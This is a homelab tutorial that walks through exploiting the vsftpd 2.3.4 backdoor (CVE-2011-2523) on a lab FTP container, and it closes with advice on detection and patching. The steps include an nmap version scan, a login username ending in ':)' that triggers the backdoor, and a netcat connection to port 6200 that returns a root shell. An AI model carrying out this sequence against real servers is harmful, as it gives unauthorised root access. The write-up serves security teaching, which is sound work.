---
title: "Part 9 - Attack 5: Exploiting Outdated Software (CVE-2011-2523)"
date: 2026-05-22
description: "Exploiting a known backdoor in vsftpd 2.3.4 (CVE-2011-2523) to gain a root shell on the FTP container via netcat."

tags:
  - cybersecurity
  - homelab
  - na101

categories:
  - cybersecurity
  - homelab writeup
  - networks and attacks 101
---

# Attack 5 — Exploiting Outdated Software (CVE-2011-2523)

## Prerequisites

Before starting, make sure the following are in place:

1. VirtualBox or VMware Workstation Pro installed
2. `project-x-corp-svr` is configured with Docker
3. FTP container (`ftp-svr`) is set up and configured
4. `project-x-attacker` is turned on

## Scenario

In this scenario, the attacker (`project-x-attacker`) identifies that the corporate server (`10.0.0.8`) is running an FTP service on port 21. Through reconnaissance, they match the software version to a known CVE and discover the server is running **vsftpd 2.3.4** — a version that contains a deliberately planted backdoor. By sending a specially crafted username string during the FTP login, the attacker triggers the backdoor, which opens a shell on port 6200. A netcat connection to that port gives the attacker a root shell inside the container — no password required.

## Likeliness Meter

![Likeliness Meter](attack5.png)

**Rating: High**

CVE-2011-2523 specifically is unlikely to appear in the wild today — it's an old and well-documented vulnerability that virtually all scanners will catch. But the broader pattern it represents — **exploitation of outdated software** — is one of the most consistently high-likelihood attack paths in real-world breaches. Attackers routinely scan for outdated service versions, cross-reference them against CVE databases, and deploy exploit code that is often already scripted and ready to run. The moment a service falls behind on patches, the window opens.

## Background: Exploiting Outdated Software

There's a reason you constantly hear *"keep your systems up to date."*

Outdated software refers to applications, services, or operating systems that have not been patched to fix known vulnerabilities. When a vulnerability is discovered and disclosed — either responsibly or publicly — it gets assigned a **CVE (Common Vulnerabilities and Exposures)** identifier and documented in databases like the [NIST National Vulnerability Database](https://nvd.nist.gov/). From that point on, the vulnerability is effectively public knowledge.

Attackers exploit this in a straightforward way:

1. **Reconnaissance** — Scan the target network and enumerate software versions running on open ports
2. **CVE matching** — Cross-reference identified versions against CVE databases to find known vulnerabilities
3. **Exploitation** — Find or write exploit code targeting the vulnerability and execute it against the target

The key reason this attack path is so reliable is that the gap between patch release and actual deployment is often wide — sometimes weeks, sometimes years. Organisations run legacy systems, vendors stop supporting old software, and updates get delayed in favour of stability. Every day a vulnerable version stays running is another day an attacker can use it.

### CVE-2011-2523 — The vsftpd 2.3.4 Backdoor

CVE-2011-2523 is a particularly notable vulnerability because it wasn't a coding mistake — it was a **supply chain attack**. A maliciously modified version of vsftpd 2.3.4 was uploaded to a third-party download mirror, replacing the legitimate release. The tampered version contained a backdoor: if the username supplied during an FTP login ends with the string `:)`, the server opens a shell on **port 6200**. Anyone who then connects to that port with netcat gets a root shell — no further authentication required.

The backdoor was discovered relatively quickly and the malicious package was removed, but not before it had been downloaded and deployed in a number of environments.

## Security Implications

Exploitation of outdated software can lead to:

- **Unauthorised system access** — Remote code execution gives the attacker a foothold inside the target environment
- **Data breach or leakage** — With shell access, any files on the system are immediately accessible
- **Lateral movement** — A compromised internal server becomes a launchpad for attacking other machines on the same network
- **Persistence** — Attackers can install backdoors, create new accounts, or schedule tasks to maintain access
- **Service disruption** — A compromised container or server can be taken offline or weaponised against other targets

**The detection opportunity**: Version-based scanning and CVE matching are exactly what vulnerability management tools do. Running a regular scan with something like OpenVAS or Nessus against your own infrastructure will surface any services running known-vulnerable versions. The other detection angle is network-based: an unexpected outbound connection on an unusual port like 6200 is a strong indicator that a backdoor has been triggered.

## Running the Attack

### Step 1 — Start the FTP Container

On `project-x-corp-svr`, make sure the FTP container is running:

```bash
docker start ftp-svr
```

Log into the container's bash shell:

```bash
docker exec -it ftp-svr /bin/bash
```

![Terminal on `project-x-corp-svr` showing `docker exec -it ftp-svr /bin/bash` dropping into the container's root shell — confirming the FTP container is up and accessible.](screenshot1.png)

### Step 2 — Start vsftpd Inside the Container

Navigate to the vsftpd directory and run the binary:

```bash
cd vsftpd-2.3.4
vsftpd
```

The terminal will go blank after running `vsftpd` — this is expected. The service is now running in the foreground, listening on port 21 for incoming FTP connections.

![Terminal inside the FTP container showing `vsftpd` running — the blank output confirming the service is listening and waiting for connections on port 21.](screenshot2.png)

### Step 3 — Scan the Target from the Attacker Machine

On `project-x-attacker`, open a new terminal and run an Nmap scan against the corporate server to identify what's running on port 21:

```bash
nmap -p 21 -sV 10.0.0.8
```

The scan returns the service version — **vsftpd 2.3.4**. This is the version we need. Cross-referencing this against a CVE database reveals **CVE-2011-2523** and the backdoor behaviour immediately.

![Kali terminal showing the Nmap scan output against `10.0.0.8` — port 21 returning `vsftpd 2.3.4` as the service version, the exact version tied to CVE-2011-2523.](screenshot3.png)

### Step 4 — Trigger the Backdoor via FTP Login

On `project-x-attacker`, use the built-in `ftp` command to connect to the FTP server:

```bash
ftp 10.0.0.8
```

When prompted for a username, enter **any username ending with `:)`** — this is the trigger string that activates the backdoor:

```
Name: anyuser:)
Password: anypassword
```

The login will appear to fail or hang — that's fine. The important thing is that sending a username containing `:)` has already triggered the backdoor code inside vsftpd, which is now opening a shell listener on port 6200 in the background.

![Kali terminal showing the `ftp 10.0.0.8` connection with the username `anyuser:)` and a random password entered — the FTP prompt showing the login attempt, with the `:)` trigger string clearly visible in the username field.](screenshot4.png)

### Step 5 — Connect to the Backdoor Shell via Netcat

Open a **new terminal tab** on `project-x-attacker` and connect to port 6200 using netcat:

```bash
nc 10.0.0.8 6200
```

You now have a shell inside the FTP container. Confirm the access level:

```bash
whoami
```

The response: `root`.

![Kali terminal showing `nc 10.0.0.8 6200` connecting successfully — the shell prompt appearing, followed by `whoami` returning `root`, confirming full root access inside the vsftpd container via the CVE-2011-2523 backdoor.](screenshot5.png)

The backdoor has been successfully triggered. With a root shell inside the container, the attacker has full control — they can read files, pivot to other services on the host, install persistence mechanisms, or use the container as a launching point for further attacks on the `10.0.0.0/24` network.

## Conclusion

CVE-2011-2523 is one of the most straightforward exploits in the playbook — trigger a string, open a port, get root. The exploit itself requires no special tooling, no brute force, and no credentials. It's three commands from start to shell.

What makes this exercise valuable isn't the specific CVE — it's the **pattern**. The exact same sequence (scan → version match → CVE lookup → exploit) is how a huge proportion of real-world compromises begin. Attackers aren't always writing zero-days. More often, they're running automated scanners across IP ranges, finding services running versions from three years ago, and hitting them with exploits that have been public knowledge since the vulnerability was disclosed.

The defence is unglamorous but effective: **patch regularly, audit your software inventory, and run vulnerability scans against your own infrastructure**. If you find an outdated version, assume an attacker has already found it too.

---

*Next up — Credential Stuffing, where we take a list of known username and password pairs and systematically test them against the internal web portal.*
